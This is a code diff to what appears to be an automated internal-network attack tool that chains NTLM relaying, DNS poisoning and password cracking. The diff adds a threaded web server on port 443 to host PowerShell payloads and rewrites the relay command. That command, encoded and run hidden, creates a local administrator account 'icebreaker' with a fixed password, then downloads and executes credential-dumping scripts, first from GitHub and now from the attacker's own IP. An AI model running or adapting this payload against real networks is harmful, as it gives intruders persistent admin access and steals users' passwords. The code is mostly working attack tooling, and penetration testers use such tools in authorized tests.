@@ -14,6 +14,9 @@ import libtmux
 import requests
 import argparse
 import netifaces
+import http.server
+import socketserver
+from threading import Thread
 from datetime import datetime
 from termcolor import colored
 from libnmap.process import NmapProcess
@@ -21,6 +24,10 @@ from asyncio.subprocess import PIPE, STDOUT
 from netaddr import IPNetwork, AddrFormatError
 from subprocess import Popen, PIPE, CalledProcessError
 from libnmap.parser import NmapParser, NmapParserException
+from http.server import HTTPServer as BaseHTTPServer, SimpleHTTPRequestHandler
+
+# Debug
+#from IPython import embed
 
 # Disable the InsecureRequests warning and the 'Starting new HTTPS connection' log message
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
@@ -549,7 +556,7 @@ def parse_brute_output(brute_output, prev_creds):
                 dom_user_pwd = split[5].replace('"','').replace('%',':')
                 if dom_user_pwd not in prev_creds:
                     prev_creds.append(dom_user_pwd)
-                host_dom_user_pwd = ip+' - '+dom_user_pwd
+                host_dom_user_pwd = ip+'\\'+dom_user_pwd
 
                 duplicate = check_found_passwords(dom_user_pwd)
                 if duplicate == False:
@@ -902,7 +909,7 @@ def parse_john_show(out, prev_creds):
 
             pw = line[1]
             host = line[2]
-            host_user_pwd = host+' - '+user+':'+pw
+            host_user_pwd = host+'\\'+user+':'+pw
             if host_user_pwd not in prev_creds:
                 prev_creds.append(host_user_pwd)
                 duplicate = check_found_passwords(host_user_pwd)
@@ -965,7 +972,9 @@ def run_relay_attack(iface, args):
     elif args.auto:
         remote_cmd = run_empire_deathstar(iface, args)
     else:
-        text_cmd = "net user /add icebreaker P@ssword123456; net localgroup administrators icebreaker /add; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/DanMcInerney/Invoke-Cats/master/Invoke-Cats.ps1'); Invoke-Cats -pwds; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/DanMcInerney/Invoke-Pwds/master/Invoke-Pwds.ps1'); Invoke-Pwds"
+        local_ip = get_local_ip(iface)
+#        text_cmd = "net user /add icebreaker P@ssword123456; net localgroup administrators icebreaker /add; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/DanMcInerney/Invoke-Cats/master/Invoke-Cats.ps1'); Invoke-Cats -pwds; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/DanMcInerney/Invoke-Pwds/master/Invoke-Pwds.ps1'); Invoke-Pwds"
+        text_cmd = "net user /add icebreaker P@ssword123456; net localgroup administrators icebreaker /add; IEX (New-Object Net.WebClient).DownloadString('http://{}:443/Invoke-Cats.ps1'); Invoke-Cats -pwds; IEX (New-Object Net.WebClient).DownloadString('http://{}:443/Invoke-Pwds.ps1'); Invoke-Pwds".format(local_ip, local_ip)
         enc_cmd = encode_for_ps(text_cmd)
         remote_cmd = 'powershell -nop -exec bypass -w hidden -enc {}'.format(enc_cmd)
 
@@ -1237,6 +1246,33 @@ def run_ipv6_dns_poison():
 
     return mitm6_proc
 
+class HTTPHandler(SimpleHTTPRequestHandler):
+    """This handler uses server.base_path instead of always using os.getcwd()"""
+    def translate_path(self, path):
+        path = SimpleHTTPRequestHandler.translate_path(self, path)
+        relpath = os.path.relpath(path, os.getcwd())
+        fullpath = os.path.join(self.server.base_path, relpath)
+        return fullpath
+
+
+class HTTPServer(BaseHTTPServer):
+    """The main server, you pass in base_path which is the path you want to serve requests from"""
+    def __init__(self, base_path, server_address, RequestHandlerClass=HTTPHandler):
+        self.base_path = base_path
+        BaseHTTPServer.__init__(self, server_address, RequestHandlerClass)
+
+def start_webserver():
+    PORT = 443
+    web_dir = os.path.join(os.path.dirname(__file__), 'web')
+    handler = http.server.SimpleHTTPRequestHandler
+    #httpd = socketserver.TCPServer(("", PORT), handler)
+    httpd = HTTPServer(web_dir, ("", PORT))
+    print_info('Starting web server to host Powershell payloads')
+    t = Thread(target = httpd.serve_forever)
+    t.daemon = True
+    t.start()
+    return httpd
+
 def do_ntlmrelay(prev_creds, args, iface):
     '''
     Continuously monitor and parse ntlmrelay output
@@ -1245,6 +1281,10 @@ def do_ntlmrelay(prev_creds, args, iface):
 
     print()
     print_info('Attack 4: NTLM relay with Responder and ntlmrelayx')
+
+    if not args.command:
+        httpd = start_webserver()
+
     resp_proc, ntlmrelay_proc = run_relay_attack(iface, args)
 
     if 'dns' not in args.skip:
@@ -1262,6 +1302,7 @@ def do_ntlmrelay(prev_creds, args, iface):
         # Kill procs
         cleanup_responder(resp_proc, prev_creds)
         ntlmrelay_proc.kill()
+        httpd.shutdown()
 
         # Cleanup hash files
         cleanup_hash_files()
